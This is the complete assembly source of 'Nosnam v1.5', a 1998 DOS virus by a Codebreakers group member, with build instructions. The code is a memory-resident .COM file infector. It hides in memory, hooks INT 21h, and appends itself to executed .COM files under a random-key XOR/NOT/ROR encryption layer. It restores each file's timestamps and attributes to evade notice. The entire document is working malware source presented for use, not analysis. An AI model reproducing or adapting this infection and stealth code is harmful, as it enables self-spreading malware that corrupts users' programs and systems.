; ------------------------------------------------------------------------- ;
;          Nosnam v1.5 coded by KilJaeden of the Codebreakers 1998          ;
; ------------------------------------------------------------------------- ;
; Description: `-------------------| Started: 07/06/98 | Finished: 09/06/98 ;
;                                  `-------------------^------------------- ;
; v1.0 - TSR *.com appender, direct MCB manipulation style      | Size: 430 ;
; v1.1 - add some XOR,NEG,NOT,ROR encryption to this            `---------- ;
; v1.2 - Infects only files < 1,000 bytes and > 62,000 bytes                ;
; v1.3 - saves and restores the time / date stamps                          ;
; v1.4 - infects files with any attributes                                  ;
; v1.5 - saves and restores file attributes                                 ;
; ------------------------------------------------------------------------- ;
; ------> For Christine Moore, For The Codebreakers & For Mind Warp  <----- ;
; ------------------------------------------------------------------------- ;
; to compile ::] tasm nosnam.asm                                            ;
; to link :::::] tlink /t nosnam.obj                                        ;
; ------------------------------------------------------------------------- ;

        code    segment                 ; name our segment 'code'
        assume  cs:code,ds:code         ; assign cs and ds to code
        org     100h                    ; this be a .com file
        .286                            ; needed for pusha/popa

blank:  db      0e9h,0,0                ; define blank jump
start:  call    delta                   ; push IP on to stack
delta:  pop     bp                      ; pop it into BP
        sub     bp,offset delta         ; get delta offset

encryp: jmp     first                   ; jump to first (overwritten)
        lea     si,[bp+encd]            ; load SI with encrypted area start
        mov     di,si                   ; move that address into DI
        call    encr                    ; call the encryption loop
        jmp     encd                    ; jump to encrypted area start

encr:   lodsb                           ; load a byte from AL
        not     al                      ; encryptin 1
        ror     al,4                    ; encryptin 2
        neg     al                      ; encryptin 3
        xor     al,byte ptr [bp+key]    ; unencrypt 4
        neg     al                      ; unencrypt 3
        ror     al,4                    ; unencrypt 2
        not     al                      ; unencrypt 1
        stosb                           ; store the byte
        loop    encr                    ; do all the bytes
        ret                             ; return from call

        key db 0                        ; define our key here

encd:   mov     ax,0deadh               ; move 0deadh into AX
        int     21h                     ; if resident, 0deadh is in BX
        cmp     bx,0deadh               ; check to see if it is
        jne     go_rez                  ; nope, go rezident now
	jmp	first3			; jump to first three

go_rez: sub     word ptr cs:[2],80h     ; lower top of memory data in PSP
        mov     ax,cs                   ; move CS into AX
        dec     ax                      ; decrement AX
        mov     ds,ax                   ; move new value into DS
        sub     word ptr ds:[3],80h     ; sub 2kb from accessed MCB
        xor     ax,ax                   ; AX to 0 now
        mov     ds,ax                   ; DS is now 0
        sub     word ptr ds:[413h],2    ; adjust BIOS data area by 2kb
        mov     ax,word ptr ds:[413h]   ; move adjusted BIOS mem to AX
        mov     cl,6                    ; load CL with 6
        shl     ax,cl                   ; multiply BIOS base mem by 64
        mov     es,ax                   ; move the value to ES
        push    cs                      ; push CS again so you can
        pop     ds                      ; restore DS to original value
        xor     di,di                   ; DI is now 0
        lea     si,[bp+start]           ; SI loaded with start address
        mov     cx,finished-start       ; # of bytes to write
        rep     movsb                   ; load virus into memory

hook:   xor     ax,ax                   ; ax to 0
        mov     ds,ax                   ; DS to 0
        lea     ax,isr                  ; point IVT to new ISR
        sub     ax,offset start         ; subtract start offset
        mov     bx,es                   ; move extra segment into BX

        cli                                             ; clear interrupts
        xchg    ax,word ptr ds:[21h*4]                  ; getting Int 21
        xchg    bx,word ptr ds:[21h*4+2]                ; into bx and ax
        mov     word ptr es:[oi21-offset start],ax      ; save old int 21
        mov     word ptr es:[oi21+2-offset start],bx    ; save old int 21
        sti                                             ; restore interrupts

        push    cs                      ; push code segment register
        push    cs                      ; push it again
        pop     ds                      ; put it into DS
        pop     es                      ; put it into ES

first3: lea     si,[bp+buffer]          ; restore first three bytes
	mov	di,100h			; 100h to restore them too
        push    di                      ; push 100h on to stack
	movsb				; move one byte
	movsw				; move one word
        retn                            ; return control to host

isr:    pushf                           ; push all the flags
        cmp     ax,0deadh               ; have we added check value?
        jne     exec                    ; yup, wait now for 4bh
        mov     bx,0deadh               ; nope adding it now
        popf                            ; pop all flags
        iret                            ; pop cs:ip+flags from stack

exec:   pusha                           ; push all registers
        push    ds                      ; push DS
        push    es                      ; likewize for ES
        cmp     ah,4bh                  ; something being executed?
        je      main                    ; yup, on with the infecting
        jmp     exit2                   ; naw, jump to original ISR
goexit: jmp     exit                    ; need this to make the jump

main:   push    bp                      ; save original delta offset
        call    tsrdel                  ; push IP on to stack
tsrdel: pop     bp                      ; pop it off into BP
        sub     bp,offset tsrdel        ; get 2nd delta offset 

        push    ds                      ; push DS again
        pop     es                      ; and pop it into ES
        mov     di,dx                   ; move file info into DI
        mov     cx,64                   ; 64 byte filename possible
        mov     al,'.'                  ; load al with .
        cld                             ; clear direction flag
        repnz   scasb                   ; scan until . is hit
        cmp     word ptr ds:[di],'OC'   ; check for .CO-
        jne     goexit                  ; not a .com file, exit
        cmp     word ptr ds:[di+2],'M'  ; check for .--M
        jne     goexit                  ; not a .com file, exit

        mov     ax,4300h                ; get file attributes
        int     21h                     ; we have the attributes
        push    cx                      ; save attribute #1
        push    dx                      ; save attribute #2
        push    ds                      ; save attribute #3

        mov     ax,4301h                ; set file attributes
        xor     cx,cx                   ; to none at all
        int     21h                     ; file is ready now

        mov     ax,3d02h                ; open the file now
        int     21h                     ; open it up now
        xchg    bx,ax                   ; move the info

        push    cs                      ; push code segment register
        push    cs                      ; push it again
        pop     ds                      ; put it into DS
        pop     es                      ; put it into ES

        mov     ax,5700h                ; get the time / date stamps
        int     21h                     ; got them now
        push    dx                      ; save value #1
        push    cx                      ; save value #2

        mov     ah,3fh                  ; the record function
        lea     dx,[bp+buffer]          ; record bytes here
        mov     cx,3                    ; record three bytes
        int     21h                     ; restore them now

        mov     ax,4202h                ; scan to end of file
        cwd                             ; dx to 0
        xor     cx,cx                   ; cx to 0
        int     21h                     ; DX:AX = file size now!

        cmp     dx,0                        ; is the file < 65,535 bytes?
        jne     close                       ; way to big, close it up
        mov     cx,word ptr [bp+buffer+1]   ; move buffer+1 into CX
        add     cx,finished-start+3         ; virus size + jump
        cmp     ax,cx                       ; compare file size and CX
        jz      close                       ; if equal, close it up
        cmp     ax,1000                     ; compare 1000 bytes with CX
        jb      close                       ; file too small, close it
        cmp     ax,62000                    ; compare 62,000 bytes with AX
        ja      close                       ; file too big, close it up

        sub     ax,3                        ; subtract 3 from filesize
        mov     word ptr [bp+newjump+1],ax  ; write as our new jump

        mov     ax,4200h                ; point to start of file
        cwd                             ; dx to 0
        xor     cx,cx                   ; cx to 0
        int     21h                     ; now pointing to start

        mov     ah,40h                  ; write to file
        mov     cx,3                    ; three bytes
        lea     dx,[bp+newjump]         ; write this
        int     21h                     ; jump is written

        mov     ax,4202h                ; scan to end of file
        cwd                             ; dx to 0
        xor     cx,cx                   ; cx to 0
        int     21h                     ; now pointing to end

        in      al,40h                  ; get random value
        mov     byte ptr [bp+key],al    ; save as our key

        mov     ah,40h                  ; write to file
        lea     dx,[bp+start]           ; where to start
        mov     cx,encd-start           ; # of bytes to write
        int     21h                     ; write those bytes

        lea     di,[bp+finished]        ; DI points to encrypted area end
        push    di                      ; save value, we need it in a minute
        lea     si,[bp+encd]            ; SI points to encrypted area start
        mov     cx,finished-encd        ; # of bytes to encrypt
        push    cx                      ; save value, we need it in a minute
        call    encr                    ; encrypt those bytes now

        mov     ah,40h                  ; write to file
        pop     cx                      ; use that saved value from before
        pop     dx                      ; use the other saved value 
        int     21h                     ; write those bytes

close:  mov     ax,5701h                ; set time / date stamps
        pop     cx                      ; from saved value #2
        pop     dx                      ; from saved value #1
        int     21h                     ; time / date is restored

        mov     ax,4301h                ; set file attributes
        pop     ds                      ; from saved value #3
        pop     dx                      ; from saved value #2
        pop     cx                      ; from saved value #1
        int     21h                     ; attributes restored

        mov     ah,3eh                  ; close the file
        int     21h                     ; file is closed

exit:   pop     bp                      ; pop the original delta offset
exit2:  pop     es                      ; pop ES from stack
        pop     ds                      ; pop DS from stack
        popa                            ; pop all registers
        popf                            ; pop all flags
        db      0eah                    ; jump to original ISR

; ---------------------------( The Data Area )----------------------------- ;
; ------------------------------------------------------------------------- ;

        oi21    dd ?                    ; old int 21 goes here
        buffer  db 0cdh,20h,0           ; terminates 1st gen
        virname db 'Nosnam',0           ; the virus name
        newjump db 0e9h,0,0             ; blank jump 1st gen
        finished label near             ; the offset label

; ---------------------( Not Saved / Not Encrypted )----------------------- ;
; ------------------------------------------------------------------------- ;

first:  lea     di,[bp+encryp]          ; load with start address
        lea     si,[bp+new]             ; load with bytes to move
        movsw                           ; move two bytes
        movsb                           ; move one byte
        jmp     encd                    ; jump to encrypted area

new:    mov     cx,finished-encd        ; this will overwrite the jump

; ------------------------------( The End )-------------------------------- ;
; ------------------------------------------------------------------------- ;

        code    ends                    ; end code segment
        end     blank                   ; end it all / where to start

; ------------------------------------------------------------------------- ;
; ---------> How Can You Think Freely In The Shadow Of A Church? <--------- ;
; ------------------------------------------------------------------------- ;

